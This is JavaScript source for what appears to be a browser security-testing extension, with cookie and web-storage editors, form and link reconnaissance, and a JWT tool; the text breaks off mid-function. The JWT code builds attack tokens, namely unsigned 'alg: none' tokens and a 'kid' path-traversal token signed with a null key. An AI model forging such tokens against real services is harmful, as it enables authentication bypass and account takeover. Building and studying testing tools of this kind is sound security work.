'use strict';

// ─── Core helpers ─────────────────────────────────────────────────────────────

const $ = id => document.getElementById(id);
const $$ = sel => document.querySelectorAll(sel);
const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const copyText = t => navigator.clipboard.writeText(String(t)).catch(() => {});
const isJWT = v => /^[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test((v||'').trim());

function downloadText(filename, text, type = 'text/plain') {
  const blob = new Blob([text], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function absolutizeUrl(raw, base) {
  try { return new URL(raw, base).href; } catch { return null; }
}

function prettyJSON(str) {
  try {
    const obj = JSON.parse(str);
    if (typeof obj === 'object' && obj !== null) return JSON.stringify(obj, null, 2);
  } catch {}
  return null;
}

function bg(type, data = {}) {
  return new Promise(resolve =>
    chrome.runtime.sendMessage({ type, ...data }, r => {
      if (chrome.runtime.lastError) return resolve({ error: chrome.runtime.lastError.message });
      resolve(r || {});
    })
  );
}

async function getActiveTab() {
  // DevTools panel: inspectedWindow.tabId is the correct tab regardless of focus
  if (typeof chrome.devtools !== 'undefined' && chrome.devtools.inspectedWindow?.tabId) {
    return chrome.tabs.get(chrome.devtools.inspectedWindow.tabId).catch(() => null);
  }
  // Popup context: lastFocusedWindow is reliable
  const tabs = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
  return tabs[0] ?? null;
}

function isHttpUrl(url) {
  return typeof url === 'string' && (url.startsWith('http://') || url.startsWith('https://'));
}

// execPage injects a real function (no eval) — works on sites that block eval (e.g. GitHub CSP)
async function execPage(fn, args = []) {
  const tab = await getActiveTab();
  const url = tab?.url ?? '';
  if (!tab?.id || !isHttpUrl(url)) {
    throw new Error('Navigate to a real http/https page first.');
  }
  const results = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    world: 'MAIN',
    func: fn,
    args,
  });
  return results?.[0]?.result ?? null;
}

function readStorageNamespace(ns) {
  try {
    return JSON.stringify(Object.fromEntries(
      Object.keys(window[ns]).map(k => [k, window[ns].getItem(k)])
    ));
  } catch {
    return '{}';
  }
}

function toast(msg, type = 'info') {
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.textContent = msg;
  $('toast-container').appendChild(el);
  setTimeout(() => el.remove(), 3000);
}

// ─── State ────────────────────────────────────────────────────────────────────

const state = {
  tabId:           null,
  tabUrl:          '',
  localCache:      {},
  sessionCache:    {},
  cookiesCache:    [],
  cookieEditIdx:   null,
  storageAddType:  'local',
  storageEditKey:  null,
  roles:           [],
  activeRoleId:    null,
  jwtSourceCookie: null,
  ctxIdx:          null,
  dispatchLastPaneTab: 'headers',
  customPayloadCats: [],
  payloadGroupOrders: {},
  payloadGraphQLMethod: 'POST',
  storageView:     'local',
  roleEditId:      null,
  ctxSource:       null,
};

// ─── Tabs ─────────────────────────────────────────────────────────────────────

function initTabs() {
  $$('.nav-btn').forEach(btn => btn.addEventListener('click', () => {
    $$('.nav-btn').forEach(b => b.classList.remove('active'));
    $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
    btn.classList.add('active');
    const pane = $('tab-' + btn.dataset.tab);
    pane.classList.remove('hidden');
    pane.classList.add('active');
  }));
}

// ─── Cookies ──────────────────────────────────────────────────────────────────

function formatBgError(error) {
  if (!error) return 'Unknown error';
  return error.message || String(error);
}

function buildCookieSetDetails(details) {
  const cookie = { ...details };
  Object.keys(cookie).forEach(k => {
    if (cookie[k] == null) delete cookie[k];
  });
  if (cookie.sameSite === 'unspecified') delete cookie.sameSite;
  if (!cookie.domain) delete cookie.domain;
  if (!cookie.path) cookie.path = '/';
  return cookie;
}

function cookieUrlForDetails(cookie) {
  const scheme = (cookie.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
  const host = String(cookie.domain || '').replace(/^\./, '');
  const path = cookie.path || '/';
  return `${scheme}://${host}${path.startsWith('/') ? path : '/' + path}`;
}

function buildCookieSetDetailsFromExisting(cookie, overrides = {}) {
  const details = {
    url: cookieUrlForDetails(cookie),
    name: cookie.name,
    value: cookie.value,
    path: cookie.path || '/',
    httpOnly: !!cookie.httpOnly,
    secure: !!cookie.secure,
    sameSite: cookie.sameSite,
    storeId: cookie.storeId,
    partitionKey: cookie.partitionKey,
  };
  if (!cookie.hostOnly) details.domain = cookie.domain;
  if (cookie.expirationDate) details.expirationDate = cookie.expirationDate;
  return buildCookieSetDetails({ ...details, ...overrides });
}

function validateCookieSetDetails(cookie) {
  if (cookie.sameSite === 'no_restriction' && !cookie.secure) {
    return 'SameSite=None requires Secure. Choose Unspecified or enable Secure.';
  }
  if (cookie.name?.startsWith('__Secure-') && !cookie.secure) {
    return '__Secure- cookies require the Secure flag.';
  }
  if (cookie.name?.startsWith('__Host-')) {
    if (!cookie.secure) return '__Host- cookies require the Secure flag.';
    if (cookie.path !== '/') return '__Host- cookies require path "/".';
    if (cookie.domain) return '__Host- cookies cannot set a Domain value.';
  }
  if ((cookie.name?.startsWith('__Http-') || cookie.name?.startsWith('__Host-Http-')) && (!cookie.secure || !cookie.httpOnly)) {
    return '__Http- cookies require both Secure and HttpOnly.';
  }
  return null;
}

const Cookies = {
  async load({ syncTab = true } = {}) {
    if (syncTab) {
      const tab = await getActiveTab().catch(() => null);
      if (tab?.id) state.tabId = tab.id;
      if (isHttpUrl(tab?.url)) state.tabUrl = tab.url;
    }
    if (!isHttpUrl(state.tabUrl)) {
      state.cookiesCache = [];
      this.render();
      return [];
    }
    const { cookies = [], error } = await bg('GET_COOKIES', { url: state.tabUrl });
    if (error) { toast(`Cookie refresh error: ${formatBgError(error)}`, 'error'); return state.cookiesCache; }
    state.cookiesCache = cookies;
    this.render();
    return cookies;
  },

  async reloadAfterMutation() {
    const before = JSON.stringify(state.cookiesCache.map(c => [c.name, c.value, c.domain, c.path, c.storeId, c.hostOnly]));
    for (let i = 0; i < 8; i++) {
      await new Promise(resolve => setTimeout(resolve, i < 2 ? 120 : 250));
      const cookies = await this.load();
      const after = JSON.stringify(cookies.map(c => [c.name, c.value, c.domain, c.path, c.storeId, c.hostOnly]));
      if (after !== before) return cookies;
    }
    return state.cookiesCache;
  },

  render() {
    const filter = $('cookies-filter').value.toLowerCase();
    const rows = state.cookiesCache
      .map((c, i) => ({ c, i, jwt: isJWT(c.value) }))
      .filter(({ c }) => !filter ||
        c.name.toLowerCase().includes(filter) ||
        c.value.toLowerCase().includes(filter)
      )
      .sort((a, b) => (b.jwt ? 1 : 0) - (a.jwt ? 1 : 0))
      .map(({ c, i }) => {
        const jwt = isJWT(c.value);
        const shortVal = esc(c.value.substring(0, 80)) + (c.value.length > 80 ? '…' : '');
        const ss = c.sameSite && c.sameSite !== 'no_restriction' && c.sameSite !== 'unspecified';
        const badges = [
          c.httpOnly ? `<span class="flag-badge on">HttpOnly</span>` : '',
          c.secure   ? `<span class="flag-badge on">Secure</span>` : '',
          ss         ? `<span class="flag-badge ss">${esc(c.sameSite)}</span>` : '',
          jwt        ? `<span class="flag-badge jwt">JWT</span>` : '',
          !c.expirationDate ? `<span class="flag-badge">Session</span>` : '',
          c.domain   ? `<span class="flag-badge dim" title="${esc(c.domain)}${esc(c.path)}">${esc(c.domain.replace(/^\./,''))}</span>` : '',
        ].filter(Boolean).join('');
        return `
        <div class="st-entry ${jwt ? 'jwt-entry' : ''}" data-idx="${i}">
          <div class="st-entry-btns">
            <button class="sm" data-action="edit" data-idx="${i}" title="Edit" aria-label="Edit">Edit</button>
            <button class="sm danger" data-action="del" data-idx="${i}" title="Delete" aria-label="Delete">Delete</button>
            <button class="sm" data-action="copy" data-idx="${i}" title="Copy" aria-label="Copy">Copy</button>
            ${jwt ? `<button class="sm jwt-send" data-action="send-jwt" data-idx="${i}">JWT</button>` : ''}
          </div>
          <div class="st-entry-content">
            <div class="st-entry-key"><span class="st-label">Name:</span> <span class="ck-text">${esc(c.name)}</span></div>
            <div class="st-entry-val"><span class="st-label">Value:</span> <span class="val-text">${esc(prettyJSON(c.value) || c.value)}</span></div>
            <div class="ck-meta-flags">${badges}</div>
          </div>
        </div>`;
      })
      .join('');
    $('cookies-body').innerHTML = rows || '<div class="empty" style="padding:10px">No cookies</div>';
  },

  inlineEdit(idx, field, td) {
    if (td.querySelector('textarea')) return;
    const c = state.cookiesCache[idx];
    const orig = c[field];
    const input = document.createElement('textarea');
    input.className = 'inline-input';
    input.value = orig;
    input.rows = Math.max(2, Math.ceil(orig.length / 60));
    td.textContent = '';
    td.appendChild(input);
    input.focus();
    input.select();

    let saved = false;
    const save = async () => {
      if (saved) return;
      saved = true;
      const newVal = input.value;
      if (newVal === orig) { this.render(); return; }
      await this.inlineSave(idx, field, newVal);
    };
    input.addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); save(); }
      if (e.key === 'Escape') { saved = true; this.render(); }
    });
    input.addEventListener('blur', save);
  },

  async inlineSave(idx, field, newVal) {
    const c = state.cookiesCache[idx];

    if (field === 'name' && newVal !== c.name) {
      await bg('REMOVE_COOKIE_EXACT', { cookie: c });
    }
    const cookie = buildCookieSetDetailsFromExisting(c, {
      name: field === 'name' ? newVal : c.name,
      value: field === 'value' ? newVal : c.value,
    });
    const { error } = await bg('SET_COOKIE', { cookie });
    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); }
    else toast('Saved', 'success');
    await this.reloadAfterMutation();
  },

  sendToJWT(idx) {
    const c = state.cookiesCache[idx];
    state.jwtSourceCookie = c;
    $$('.nav-btn').forEach(b => b.classList.remove('active'));
    $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
    document.querySelector('.nav-btn[data-tab="jwt"]').classList.add('active');
    const pane = $('tab-jwt');
    pane.classList.remove('hidden');
    pane.classList.add('active');
    $('jwt-input').value = c.value;
    $('jwt-cookie-source').textContent = `← from cookie: ${c.name}`;
    $('jwt-cookie-source').classList.remove('hidden');
    $('jwt-to-cookie-btn').classList.remove('hidden');
    try {
      const { header, payload } = JWT.decode(c.value);
      $('jwt-header').value  = JSON.stringify(header, null, 2);
      $('jwt-payload').value = JSON.stringify(payload, null, 2);
      $('jwt-sections').classList.remove('hidden');
    } catch {}
    hideCtxMenu();
  },

  openEdit(idx) {
    state.cookieEditIdx = idx;
    const c = idx !== null ? state.cookiesCache[idx] : null;
    $('cookie-modal-title').textContent = c ? 'Edit Cookie' : 'Add Cookie';
    $('ck-name').value    = c?.name  ?? '';
    $('ck-value').value   = c?.value ?? '';
    $('ck-domain').value  = c ? (c.hostOnly ? '' : c.domain) : (new URL(state.tabUrl).hostname || '');
    $('ck-path').value    = c?.path  ?? '/';
    $('ck-expires').value = c?.expirationDate ? tsToDatetimeLocal(c.expirationDate) : '';
    $('ck-httponly').checked = c?.httpOnly ?? false;
    $('ck-secure').checked   = c?.secure   ?? false;
    $('ck-samesite').value   = c?.sameSite ?? 'unspecified';
    $('cookie-modal').classList.remove('hidden');
    $('ck-name').focus();
  },

  closeModal() {
    $('cookie-modal').classList.add('hidden');
    state.cookieEditIdx = null;
  },

  async save() {
    const name    = $('ck-name').value.trim();
    const value   = $('ck-value').value;
    const domain  = $('ck-domain').value.trim();
    const path    = $('ck-path').value || '/';
    const expStr  = $('ck-expires').value;
    const httpOnly = $('ck-httponly').checked;
    const secure   = $('ck-secure').checked;
    const sameSite = $('ck-samesite').value;

    if (!name) { toast('Name required', 'error'); return; }

    const scheme = (secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
    const fallbackHost = (() => { try { return new URL(state.tabUrl).hostname; } catch { return ''; } })();
    const host   = domain ? (domain.startsWith('.') ? domain.slice(1) : domain) : fallbackHost;
    const url    = `${scheme}://${host}${path}`;

    const rawCookie = { url, name, value, domain, path, httpOnly, secure, sameSite };
    const validationError = validateCookieSetDetails(rawCookie);
    if (validationError) { toast(validationError, 'error'); return; }
    const cookie = buildCookieSetDetails(rawCookie);
    if (expStr) cookie.expirationDate = datetimeLocalToTs(expStr);

    if (state.cookieEditIdx !== null) {
      const old = state.cookiesCache[state.cookieEditIdx];
      const oldDomain = old.hostOnly ? '' : old.domain;
      if (old.name !== name || oldDomain !== domain || old.path !== path) {
        await bg('REMOVE_COOKIE_EXACT', { cookie: old });
      }
    }

    const { error } = await bg('SET_COOKIE', { cookie });
    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
    toast('Saved', 'success');
    this.closeModal();
    await this.reloadAfterMutation();
  },

  async del(idx) {
    const c = state.cookiesCache[idx];
    const { ok, error } = await bg('REMOVE_COOKIE_EXACT', { cookie: c });
    if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
    if (!ok) { toast('Cookie was not removed', 'warn'); await this.reloadAfterMutation(); return; }
    toast('Deleted', 'success');
    await this.reloadAfterMutation();
  },

  async clearAll() {
    if (!confirm(`Delete all ${state.cookiesCache.length} cookies for this site?`)) return;
    await Promise.all(state.cookiesCache.map(c => bg('REMOVE_COOKIE_EXACT', { cookie: c })));
    toast('All cookies cleared', 'success');
    await this.reloadAfterMutation();
  },
};

function tsToDatetimeLocal(ts) {
  return new Date(ts * 1000).toISOString().slice(0, 16);
}
function datetimeLocalToTs(str) {
  return Math.floor(new Date(str).getTime() / 1000);
}

// ─── Storage ──────────────────────────────────────────────────────────────────

const Storage = {
  _safeParse(raw) {
    try { return JSON.parse(raw || '{}'); } catch { return {}; }
  },

  async loadLocal() {
    const raw = await execPage(readStorageNamespace, ['localStorage']).catch(() => '{}');
    state.localCache = this._safeParse(raw);
    this.renderTable('local', state.localCache);
  },

  async loadSession() {
    const raw = await execPage(readStorageNamespace, ['sessionStorage']).catch(() => '{}');
    state.sessionCache = this._safeParse(raw);
    this.renderTable('session', state.sessionCache);
  },

  async load() {
    await Promise.all([this.loadLocal(), this.loadSession()]);
  },

  switchView(type) {
    state.storageView = type;
    const showLocal = type === 'local';
    $('local-panel').classList.toggle('hidden', !showLocal);
    $('session-panel').classList.toggle('hidden', showLocal);
    $('storage-switch-local').classList.toggle('primary', showLocal);
    $('storage-switch-session').classList.toggle('primary', !showLocal);
    $('local-count').classList.toggle('hidden', !showLocal);
    $('session-count').classList.toggle('hidden', showLocal);

    if (showLocal) this.loadLocal();
    else this.loadSession();
  },

  renderTable(type, data) {
    const bodyId   = `${type}-body`;
    const countEl  = $(`${type}-count`);
    const filter   = ($('storage-filter')?.value || '').toLowerCase();
    const entries  = Object.entries(data).filter(([k, v]) =>
      !filter || k.toLowerCase().includes(filter) || String(v).toLowerCase().includes(filter)
    );
    if (countEl) countEl.textContent = entries.length;

    const makeRow = (k, v) => {
      const vStr = String(v);
      const pretty = prettyJSON(vStr);
      const display = pretty || vStr;
      const collapsible = display.length > 80;
      const preview = collapsible ? esc(vStr.substring(0, 60)) + '…' : '';
      const valHtml = collapsible
        ? `<div class="collapsible collapsed">
            <span class="collapse-preview">${preview}</span>
            <span class="collapse-full val-text">${esc(display)}</span>
            <button class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle value"></button>
          </div>`
        : `<span class="val-text">${esc(display)}</span>`;
      return `<div class="st-entry" data-type="${esc(type)}" data-key="${esc(k)}">
        <div class="st-entry-btns">
          <button class="sm" data-action="st-edit" data-st="${esc(type)}" data-skey="${esc(k)}" title="Edit" aria-label="Edit">Edit</button>
          <button class="sm danger" data-action="st-del" data-st="${esc(type)}" data-skey="${esc(k)}" title="Delete" aria-label="Delete">Delete</button>
          <button class="sm" data-action="st-copy" data-val="${esc(vStr)}" title="Copy" aria-label="Copy">Copy</button>
        </div>
        <div class="st-entry-content">
          <div class="st-entry-key"><span class="st-label">Key:</span> <span class="ck-text">${esc(k)}</span></div>
          <div class="st-entry-val"><span class="st-label">Value:</span> ${valHtml}</div>
        </div>
      </div>`;
    };

    const rows = entries.map(([k, v]) => makeRow(k, v));

    $(bodyId).innerHTML = rows.join('') || `<div class="empty" style="padding:10px">Empty</div>`;
  },

  inlineEdit(type, field, key, el) {
    const cache = type === 'local' ? state.localCache : state.sessionCache;
    const cur = field === 'key' ? key : (cache[key] ?? '');
    const inp = document.createElement('textarea');
    inp.className = 'inline-input';
    inp.value = cur;
    inp.rows = Math.max(2, Math.ceil(String(cur).length / 60));
    el.replaceWith(inp);
    inp.focus(); inp.select();
    const commit = async () => {
      const nv = inp.value;
      if (nv === cur) { this.renderTable(type, cache); return; }
      const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
      if (field === 'key') {
        const oldVal = cache[key];
        await execPage((ns, k) => window[ns].removeItem(k), [nsName, key]);
        await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, nv, oldVal]);
      } else {
        await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, key, nv]);
      }
      toast('Saved', 'success');
      await this.load();
    };
    inp.addEventListener('blur',    commit);
    inp.addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); inp.blur(); }
      if (e.key === 'Escape') { inp.removeEventListener('blur', commit); this.renderTable(type, cache); }
    });
  },

  openAdd(type) {
    state.storageAddType = type;
    state.storageEditKey = null;
    $('storage-modal-title').textContent = `Add to ${type}Storage`;
    $('sk-key').value   = '';
    $('sk-value').value = '';
    $('sk-key').disabled = false;
    $('storage-modal').classList.remove('hidden');
    $('sk-key').focus();
  },

  openEdit(type, key) {
    const cache = type === 'local' ? state.localCache : state.sessionCache;
    state.storageAddType = type;
    state.storageEditKey = key;
    $('storage-modal-title').textContent = `Edit ${type}Storage`;
    $('sk-key').value   = key;
    $('sk-value').value = cache[key] ?? '';
    $('sk-key').disabled = false;
    $('storage-modal').classList.remove('hidden');
    $('sk-value').focus();
  },

  closeModal() {
    $('storage-modal').classList.add('hidden');
    state.storageEditKey = null;
  },

  async save() {
    const key = $('sk-key').value.trim();
    const val = $('sk-value').value;
    if (!key) { toast('Key required', 'error'); return; }
    const nsName = state.storageAddType === 'local' ? 'localStorage' : 'sessionStorage';
    if (state.storageEditKey && state.storageEditKey !== key) {
      await execPage((ns, k) => window[ns].removeItem(k), [nsName, state.storageEditKey]);
    }
    await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, key, val]);
    toast('Saved', 'success');
    this.closeModal();
    await this.load();
  },

  async del(type, key) {
    const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
    await execPage((ns, k) => window[ns].removeItem(k), [nsName, key]);
    toast('Deleted', 'success');
    await this.load();
  },

  async clearAll(type) {
    const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
    if (!confirm(`Clear all ${nsName} entries?`)) return;
    await execPage((ns) => window[ns].clear(), [nsName]);
    toast('Cleared', 'success');
    this.load();
  },
};

// ─── JWT ──────────────────────────────────────────────────────────────────────

function b64urlEncode(str) {
  const bytes = new TextEncoder().encode(str);
  return btoa(String.fromCharCode(...bytes))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function b64urlEncodeBytes(bytes) {
  return btoa(String.fromCharCode(...new Uint8Array(bytes)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function b64urlDecode(str) {
  const padded = str + '==='.slice((str.length + 3) % 4);
  try {
    return decodeURIComponent(escape(atob(padded.replace(/-/g, '+').replace(/_/g, '/'))));
  } catch {
    return atob(padded.replace(/-/g, '+').replace(/_/g, '/'));
  }
}

const JWT = {
  decode(token) {
    const parts = token.trim().split('.');
    if (parts.length < 2) throw new Error('Not a valid JWT (need at least header.payload)');
    const header  = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    return { header, payload, sig: parts[2] ?? '' };
  },

  signingInput(header, payload) {
    return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`;
  },

  async signHMAC(header, payload, secret, alg = 'HS256') {
    const HASH_MAP = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
    const hash = HASH_MAP[alg.toUpperCase()];
    if (!hash) throw new Error(`Unsupported HMAC alg: ${alg}`);
    const data = this.signingInput({ ...header, alg }, payload);
    const key = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(secret),
      { name: 'HMAC', hash }, false, ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
    return `${data}.${b64urlEncodeBytes(sig)}`;
  },

  async signHS256(header, payload, secret) {
    return this.signHMAC(header, payload, secret, 'HS256');
  },

  signNone(header, payload, algValue) {
    const h = b64urlEncode(JSON.stringify({ ...header, alg: algValue }));
    const p = b64urlEncode(JSON.stringify(payload));
    return `${h}.${p}.`;
  },

  async sign(header, payload, keyMaterial, alg) {
    const upper = alg.toUpperCase();
    if (upper === 'NONE') return this.signNone(header, payload, alg);
    if (upper === 'HS256') return this.signHMAC(header, payload, keyMaterial, upper);
    throw new Error(`Unsupported alg: ${alg}`);
  },

  async buildAttackToken(type, header, payload, opts = {}) {
    const material = opts.material || '';
    if (type === 'alg-none') {
      const alg = String(opts.alg || '').toLowerCase() === 'none' ? opts.alg : 'none';
      return this.signNone({ ...header, alg }, payload, alg);
    }
    if (type === 'kid-traversal') {
      return this.signHMAC({ ...header, alg: 'HS256', kid: opts.kid || '../../../../dev/null' }, payload, material || '\x00', 'HS256');
    }
    throw new Error(`Unknown JWT attack: ${type}`);
  },

  async verifyHMAC(token, secret) {
    const parts = token.trim().split('.');
    if (parts.length !== 3) throw new Error('Need 3 parts');
    const header = JSON.parse(b64urlDecode(parts[0]));
    const alg = String(header.alg || 'HS256').toUpperCase();
    const HASH_MAP = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
    const hash = HASH_MAP[alg];
    if (!hash) throw new Error(`Verify currently supports HS256/384/512, token uses ${alg}`);
    const data = `${parts[0]}.${parts[1]}`;
    const key = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(secret),
      { name: 'HMAC', hash }, false, ['verify']
    );
    const sigBytes = Uint8Array.from(atob(parts[2].replace(/-/g,'+').replace(/_/g,'/')), c => c.charCodeAt(0));
    return crypto.subtle.verify('HMAC', key, sigBytes, new TextEncoder().encode(data));
  },

  async verifyHS256(token, secret) {
    return this.verifyHMAC(token, secret);
  },
};

// ─── Recon ────────────────────────────────────────────────────────────────────

const Recon = {
  spiderGroupBy: 'domain',
  spiderCache: null,

  async assertScriptable() {
    const tab = await getActiveTab();
    if (!isHttpUrl(tab?.url)) throw new Error('Navigate to a real http/https page first.');
    // Refresh state.tabUrl so sourceScan and cookie load stay accurate
    state.tabUrl = tab.url;
  },

  async forms() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const raw = await execPage(() => {
      try {
        return JSON.stringify(Array.from(document.querySelectorAll('form')).map(f => ({
          id:     f.id || null,
          action: f.action,
          method: (f.method || 'GET').toUpperCase(),
          inputs: Array.from(f.querySelectorAll('input,select,textarea')).map(el => ({
            type:  el.type || el.tagName.toLowerCase(),
            name:  el.name,
            id:    el.id,
            value: el.type === 'password' ? '***' : el.value,
            placeholder: el.placeholder || '',
          })),
        })));
      } catch { return '[]'; }
    }).catch(e => { toast(String(e), 'error'); return '[]'; });
    const forms = JSON.parse(raw);
    let html = `<div class="recon-section" id="recon-sec-forms" data-severity="info" data-section-name="Forms"><h4>Forms (${forms.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="forms" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
    if (!forms.length) html += '<div class="recon-item muted">No forms found</div>';
    forms.forEach(f => {
      html += `<div class="recon-item">
        <b>${esc(f.method)}</b> ${esc(f.action)}${f.id ? ` <span class="muted">#${esc(f.id)}</span>` : ''}
        <div style="margin-top:4px;color:var(--dim)">`;
      f.inputs.forEach(i => {
        html += `<span style="margin-right:10px">[<b>${esc(i.type)}</b>] name=<span style="color:var(--text)">${esc(i.name)}</span>${i.value ? ` val=${esc(i.value)}` : ''}</span>`;
      });
      html += `</div></div>`;
    });
    html += '</div>';
    appendRecon(html);
  },

  renderSpiderFromCache() {
    const records = this.spiderCache?.records || [];
    const byUrl = new Map();
    records.forEach(r => {
      if (!byUrl.has(r.url)) byUrl.set(r.url, { url: r.url, locations: [] });
      const suffix = r.line ? ` line ${r.line}` : '';
      const loc = r.source === 'page source' ? `HTML source${suffix}` : `${r.source || 'Unknown source'}${suffix}`;
      if (!byUrl.get(r.url).locations.includes(loc)) byUrl.get(r.url).locations.push(loc);
    });

    const grouped = {};
    if (this.spiderGroupBy === 'source') {
      records.forEach(r => {
        const entry = byUrl.get(r.url);
        const key = r.sourceGroup;
        if (!grouped[key]) grouped[key] = new Map();
        grouped[key].set(r.url, entry);
      });
    } else {
      Array.from(byUrl.values()).forEach(entry => {
        try {
          const host = new URL(entry.url).hostname;
          if (!grouped[host]) grouped[host] = new Map();
          grouped[host].set(entry.url, entry);
        } catch {}
      });
    }
    const groups = Object.entries(grouped)
      .map(([name, map]) => [name, Array.from(map.values()).sort((a, b) => a.url.localeCompare(b.url))])
      .sort(([a], [b]) => a.localeCompare(b));

    const total = Array.from(byUrl.values()).length;
    const SPIDER_PREVIEW = 40;
    const domainActive = this.spiderGroupBy === 'domain' ? ' active' : '';
    const sourceActive = this.spiderGroupBy === 'source' ? ' active' : '';
    let html = `<div class="recon-section" id="recon-sec-links" data-severity="info" data-section-name="Links">
    <h4>Discovered Links &amp; Assets (${total})
      <button class="recon-rerun-btn" data-action="recon-rerun" data-check="links" title="Run">Run</button>
      <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
      <button class="recon-copy-btn recon-copy-text" data-action="recon-copy" title="Copy">Copy</button>
    </h4>
    <div class="recon-links-filter">
      <span class="recon-spider-group-toggle">
        <button type="button" class="spider-group-btn${domainActive}" data-action="spider-group" data-group="domain">Domain</button>
        <button type="button" class="spider-group-btn${sourceActive}" data-action="spider-group" data-group="source">Source</button>
      </span>
    </div>`;
    for (const [group, entries] of groups) {
      html += `<div class="recon-item recon-spider-group"><b>${esc(group)}</b> <span class="muted">(${entries.length})</span><div class="recon-spider-urls">`;
      const renderLine = entry => `<div class="recon-spider-line" data-url="${esc(entry.url)}" data-locations="${esc(entry.locations.join(' | '))}">
        <div class="recon-spider-url-row">
          <div class="muted recon-spider-url">${esc(entry.url)}</div>
          <button class="recon-copy-btn recon-spider-details" data-action="spider-toggle-details" title="Show source locations">Details</button>
          <button class="recon-copy-btn recon-spider-repeat" data-action="spider-send-repeater" data-url="${esc(entry.url)}" title="Send to Repeater">Repeat</button>
        </div>
        <div class="recon-spider-loc hidden">${esc(entry.locations.join(' | '))}</div>
      </div>`;
      entries.slice(0, SPIDER_PREVIEW).forEach(entry => { html += renderLine(entry); });
      if (entries.length > SPIDER_PREVIEW) {
        const rest = entries.slice(SPIDER_PREVIEW);
        html += `<div class="collapsible recon-spider-extra collapsed">
          <div class="collapse-full">${rest.map(renderLine).join('')}</div>
          <div class="recon-spider-more-ctrls">
            <span class="collapse-preview muted" data-action="toggle-collapse">+${rest.length} more (expand)</span>
            <button type="button" class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle extra URLs"></button>
          </div>
        </div>`;
      }
      html += `</div></div>`;
    }
    if (!total) html += '<div class="recon-item muted">No links found</div>';
    html += '</div>';
    appendRecon(html);
  },

  async links() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const pageUrl = state.tabUrl;
    toast('Spidering DOM, source, and JS bundles...', 'info');
    const raw = await execPage(() => {
      try {
        const pick = (selector, attr, label) => Array.from(document.querySelectorAll(selector))
          .map(el => ({ url: el[attr] || el.getAttribute(attr), source: `DOM ${label}` }))
          .filter(x => x.url && !String(x.url).startsWith('data:'));
        const domLinks = [
          ...pick('a[href]', 'href', 'anchor'),
          ...pick('form[action]', 'action', 'form'),
          ...pick('script[src]', 'src', 'script'),
          ...pick('link[href]', 'href', 'link'),
          ...pick('iframe[src]', 'src', 'iframe'),
          ...pick('img[src]', 'src', 'image'),
          ...pick('source[src]', 'src', 'media'),
          ...pick('[srcset]', 'srcset', 'srcset'),
          ...pick('[data-href],[data-url],[data-src],[data-route],[data-path]', 'dataset', 'data-*')
            .flatMap(({ source }, idx) => {
              const el = document.querySelectorAll('[data-href],[data-url],[data-src],[data-route],[data-path]')[idx];
              return ['href','url','src','route','path'].map(k => el?.dataset?.[k]).filter(Boolean).map(url => ({ url, source }));
            }),
        ];
        const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean);
        return JSON.stringify({ domLinks, scripts });
      } catch { return '{"domLinks":[],"scripts":[]}'; }
    }).catch(e => { toast(String(e), 'error'); return '{"domLinks":[],"scripts":[]}'; });

    const { domLinks = [], scripts = [] } = JSON.parse(raw);
    const records = [];
    const sourceGroupLabel = source => {
      if (source === 'page source') return 'HTML source';
      return source || 'Unknown source';
    };
    const addRecord = (url, source, line = null, base = pageUrl) => {
      const abs = absolutizeUrl(url, base);
      if (!abs || abs.startsWith('data:') || abs.startsWith('javascript:') || abs.startsWith('mailto:') || abs.startsWith('tel:')) return;
      records.push({ url: abs, source, sourceGroup: sourceGroupLabel(source), line });
    };
    domLinks.forEach(({ url, source }) => {
      if (String(url).includes(',')) {
        String(url).split(',').map(x => x.trim().split(/\s+/)[0]).forEach(u => addRecord(u, source));
      } else {
        addRecord(url, source);
      }
    });

    const scanTextForLinks = (text, source, base) => {
      if (!text) return;
      const patterns = [
        /https?:\/\/[^\s"'`<>)\\]+/g,
